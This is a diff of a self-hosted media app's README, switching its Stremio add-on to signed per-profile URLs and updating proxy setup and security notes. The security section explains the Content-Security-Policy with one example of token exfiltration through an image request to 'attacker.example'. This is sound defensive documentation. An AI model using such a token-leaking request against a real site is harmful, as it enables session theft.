@@ -257,18 +257,18 @@ The Stremio app is the way to use Fetch on a TV. The web app is built for touch 
 Stremio and Omni have no way to say *who* is watching — the installed URL is the only thing that distinguishes one installation from another. Fetch therefore binds a profile to the URL itself:
 
 ```text
-http://LAN-IP:7001/p/PROFILE-ID/manifest.json
+http://LAN-IP:7001/u/PROFILE-ID/PROFILE-KEY/manifest.json
 ```
 
-Behind a reverse proxy (see the Nginx section below), the `/p/PROFILE-ID` part sits after the proxy path, not before it:
+`PROFILE-KEY` is a 64-character key derived from `API_TOKEN`, one per profile, so knowing a profile's ID is not enough to read its lists or mark things watched on it. Behind a reverse proxy (see the Nginx section below), the `/u/…` part sits after the proxy path, not before it:
 
 ```text
-https://cataloggy.domain.com/addon/p/PROFILE-ID/manifest.json
+https://fetch.example.com/addon/u/PROFILE-ID/PROFILE-KEY/manifest.json
 ```
 
 Rather than assembling either by hand, use **Settings → Stremio Addon** — it always shows the correct, ready-to-paste URL for the profile you're currently using. To install for someone else: switch to their profile, come back, and copy the URL again. Catalogs, "Mark Watched", and scrobbles from that installation all belong to that profile.
 
-The prefix-less URLs (`http://LAN-IP:7001/manifest.json`, `https://cataloggy.domain.com/addon/manifest.json`) keep working and resolve to your oldest profile, so installs made before profiles existed are unaffected — but on a household with several profiles, each person should install their own URL.
+Older URL forms keep working unless you turn them off: `/p/PROFILE-ID/manifest.json` names a profile without a key, and the prefix-less `/manifest.json` resolves to your oldest profile. Neither proves the caller may see that profile, so once the add-on is reachable from outside your home, or anyone else has an account, set `ADDON_REQUIRE_SIGNED_URLS=true` in `.env`. The add-on then answers only the signed `/u/` URLs, and each person reinstalls from **Settings → Stremio Addon**. Rotating `API_TOKEN` changes every key, so reinstall after that too.
 
 ### Profiles and the media-server webhooks
 
@@ -440,12 +440,12 @@ Fetch is invite-only. There is no public sign-up page: the first account (create
 
 ## Nginx Proxy Manager Setup
 
-Configure Nginx Proxy Manager with one Proxy Host for your domain (for example, `cataloggy.domain.com`):
+Configure Nginx Proxy Manager with one Proxy Host for your domain (for example, `fetch.example.com`):
 
 - **Proxy Host target:** web service on port `7002`
 - **Advanced locations:**
   - `/api/` → port `7000`
-  - `/addon/` → port `7001`, **only if the domain is not reachable from the internet**. The add-on service has no login (Stremio can't send one), so anyone who can reach it can read the lists of the profile in its URL. Leave this location out and keep using the add-on at `http://LAN-IP:7001` at home. See [Security](#security).
+  - `/addon/` → port `7001`, **with `ADDON_REQUIRE_SIGNED_URLS=true` in `.env`**. Stremio can't send a login, so the add-on's install URL carries a per-profile key instead, and that setting makes the add-on refuse every URL without one. Without it, anyone who can reach the add-on can read the oldest profile's lists, or any profile's whose ID they know. See [Security](#security).
 
 Then point Fetch at that one address in `.env`, so the site and the API share an origin:
 
@@ -466,15 +466,15 @@ Name the proxy rather than setting `TRUST_PROXY=true`. `true` trusts the whole f
 
 The `/api/` and `/addon/` prefixes above are stripped by the services themselves, which expect exactly those two by default. If your proxy mounts them somewhere else, set `API_PROXY_PATH_PREFIXES` / `ADDON_PROXY_PATH_PREFIXES` to match — they are separate variables because the two services need different values, and because giving the api `/addon` would strip the prefix off its own built-in Stremio manifest routes.
 
-Use this Omni add-on URL to install when accessing through your domain:
+Set `ADDON_PUBLIC_BASE` and `VITE_ADDON_BASE` to `https://fetch.example.com/addon`, and install the add-on in Stremio or Omni from the URL **Settings → Stremio Addon** shows, which has this shape:
 
 ```text
-https://cataloggy.domain.com/addon/p/PROFILE-ID/manifest.json
+https://fetch.example.com/addon/u/PROFILE-ID/PROFILE-KEY/manifest.json
 ```
 
-Copy it from **Settings → Stremio Addon** rather than filling in `PROFILE-ID` yourself — see [Profiles and the add-on URL](#profiles-and-the-add-on-url) for why the profile is part of the URL. Dropping the `/p/PROFILE-ID` segment also works and resolves to your oldest profile.
+See [Profiles and the add-on URL](#profiles-and-the-add-on-url) for why the profile and its key are part of the URL. The same signed URL works from anywhere, at home or not, so there is no separate LAN install to keep.
 
-LAN development URLs stay available, so you can continue using direct local access like `http://LAN-IP:7002` and `http://LAN-IP:7001/p/PROFILE-ID/manifest.json` on your network.
+LAN URLs stay available too, such as `http://LAN-IP:7002` for the site and `http://LAN-IP:7001/u/PROFILE-ID/PROFILE-KEY/manifest.json` for the add-on.
 
 ## Backup & Restore
 
@@ -528,10 +528,10 @@ Fetch is designed for self-hosting on a trusted local network (LAN), not for dir
 - People sign in with a username and password, and the web client stores the resulting session token in `localStorage`; `API_TOKEN` itself never reaches the browser. A session can only reach its own account's profiles, and only the admin's can change install-wide settings. Session tokens and invite codes are stored only as SHA-256 hashes, and passwords with scrypt. Any JavaScript running on the page (e.g. via an XSS vulnerability in a dependency) could still read the session token, which is the tradeoff the rest of this bullet is about. If exposing it via a reverse proxy, both the API and web client now send a restrictive `Content-Security-Policy` (no framing, and no inline script beyond the one the page itself ships, which is allowed by the SHA-256 hash of its exact contents rather than by `'unsafe-inline'`) plus `X-Content-Type-Options`/`X-Frame-Options`/`Referrer-Policy` headers to reduce the impact of a dependency-introduced XSS bug, but migrating to httpOnly session cookies would be a stronger fix if you need this on the internet.
 - That CSP's `connect-src` names only the origins this deployment actually talks to — `'self'`, plus `VITE_API_BASE`, `VITE_ADDON_BASE`, (if set) the `SENTRY_DSN` host, and the artwork CDNs the service worker caches posters from — rather than allowing every host, so script injected into the page cannot post your token to an arbitrary server. `img-src` names the same artwork CDNs (plus `'self'` and `data:`) for the same reason: an `<img>` is a request too, and pointing one at `https://attacker.example/?t=<token>` would carry the token out just as well as a `fetch` would, so leaving that directive open to every host would have undone the rest. `form-action 'self'` closes the third route out — `default-src` does not cover it, so without it injected markup could auto-submit a form off-origin. The header is rendered from `apps/web/serve.template.json` when the `web` container starts, since those origins are only known then. If some browser needs to reach an origin the container doesn't know about (most likely a per-browser API base set in Settings), add it to `CSP_CONNECT_SRC_EXTRA` — otherwise the browser will block the request. `style-src` still allows `'unsafe-inline'`, which the app's inline React styles require; style injection is far lower-risk than script injection, so that one is an accepted weakening.
 - The Stremio add-on protocol sends no credentials, so the API's built-in catalog manifest (`/addon/stremio/...`) cannot sit behind `API_TOKEN`. It is instead gated by an unguessable per-profile secret in the URL path (`/addon/stremio/<secret>/manifest.json`), derived from `API_TOKEN` and served to that profile from `GET /addon/config`; requests without a valid secret get the token check like any other route, and the secret decides which profile's lists are served, so one add-on URL cannot read another profile's library. Rotating `API_TOKEN` invalidates every add-on URL — reinstall from Settings afterwards.
-- The separate add-on service (port `7001`, the full-featured one Settings links to) is still unauthenticated: anyone who can reach it can read the lists of the profile named in its URL (or the oldest profile, for the prefix-less URL). That is inherent to the protocol — Stremio cannot send a token — so keep that port on your LAN, and do not proxy it to the internet unless you are comfortable with your watchlist being public. Its write endpoints are separately protected. The scrobble endpoint takes a bearer token derived from `API_TOKEN`, which the service never emits. "Mark Watched" cannot use that token — Stremio can only fetch a plain URL, so the credential has to be in the URL, and the subtitles response carrying it is served to anyone who asks — so each of those URLs carries a capability signed for the one profile and the one title or episode it was built for, expiring after twelve hours. Reading one out of a subtitles response (or a proxy log) therefore allows re-marking that single title, not writing arbitrary history.
+- The separate add-on service (port `7001`, the full-featured one Settings links to) can't take a login either, so Settings gives it the same kind of per-profile key in the path: `/u/<profileId>/<key>/`. With `ADDON_REQUIRE_SIGNED_URLS=true` it serves nothing else, and a wrong key gets a 404. Without that setting it also answers the older keyless `/p/<profileId>/` and prefix-less URLs, which let anyone who can reach the port read the profile named in the URL (or the oldest profile), so leave it off only while the port stays on your LAN and everyone on it shares one account. Its write endpoints are separately protected. The scrobble endpoint takes a bearer token derived from `API_TOKEN`, which the service never emits. "Mark Watched" cannot use that token — Stremio can only fetch a plain URL, so the credential has to be in the URL, and the subtitles response carrying it is served to anyone who asks — so each of those URLs carries a capability signed for the one profile and the one title or episode it was built for, expiring after twelve hours. Reading one out of a subtitles response (or a proxy log) therefore allows re-marking that single title, not writing arbitrary history.
 - Connecting a Stremio account stores only the access key Stremio issues, never your password — the password is sent once to Stremio's login endpoint, exchanged for the key, and discarded. The key is not scoped: it grants the same library access a signed-in Stremio client has. It is encrypted at rest along with the other stored credentials (see below). Disconnecting from Settings deletes it. `POST /stremio/library/connect` is rate-limited to 10/min/IP like the other credential-accepting routes.
 - Linking a Trakt account is CSRF-protected: `GET /trakt/oauth/authorize` (which requires the API token) mints a single-use `state` that expires in 10 minutes, and the callback rejects anything else — so a link someone else sends you cannot silently bind your install to their Trakt account.
-- If you do expose Fetch beyond your LAN, put it behind a reverse proxy with TLS (e.g. Nginx Proxy Manager, see [Nginx Proxy Manager Setup](#nginx-proxy-manager-setup)), and keep the add-on service and the webhooks on the LAN.
+- If you do expose Fetch beyond your LAN, put it behind a reverse proxy with TLS (e.g. Nginx Proxy Manager, see [Nginx Proxy Manager Setup](#nginx-proxy-manager-setup)), set `ADDON_REQUIRE_SIGNED_URLS=true` before proxying the add-on service, and keep the webhooks on the LAN.
 - All API routes are rate-limited globally (200 req/min/IP), with tighter per-route limits on sensitive endpoints: PIN verification (`POST /profiles/:id/verify`, 10/min/IP), the Trakt OAuth authorize/callback routes (10/min/IP), the Plex/Jellyfin/Emby webhooks (60/min/IP) and the built-in Stremio manifest/catalog routes (240/min/IP — they answer unauthenticated callers, but a Stremio home screen fetches one request per catalog, so the budget covers several refreshes a minute rather than a single request). Calls from the Stremio addon service get their own 1000 req/min bucket rather than sharing the browser's — every Stremio client reaches the API from that one container's IP. The addon identifies itself with a token derived from `API_TOKEN` (never the raw token, which the browser also holds), so nothing extra needs configuring and a leaked browser token cannot drain the addon's budget. The limiter's counters are in-memory and per-process, so they assume the documented single-`api`-container deployment; running multiple API replicas would give each its own independent budget.
 - The media-server webhook endpoints (`/webhooks/plex`, `/webhooks/jellyfin`, `/webhooks/emby`) authenticate with a single shared secret (`WEBHOOK_SECRET`) sent as a query param or header — none of the three sign their outgoing webhooks, so this is the strongest verification available. Treat `WEBHOOK_SECRET` like a password and **do not expose these endpoints to the public internet**; keep them reachable only from your LAN/reverse-proxy-internal network, where the media servers themselves run. If you must route them through a reverse proxy, set `WEBHOOK_ALLOWED_IPS` to a comma-separated allowlist of your media servers' IPs (requires `TRUST_PROXY` to be configured correctly) as a second layer of defense. Where you put the secret matters — see [Webhook secret placement](#webhook-secret-placement).
 - Container logs are capped at 10MB × 3 files per service (`docker-compose.yml`'s `x-logging` block) so they can't grow unbounded on the host over a long-running, unattended deployment.
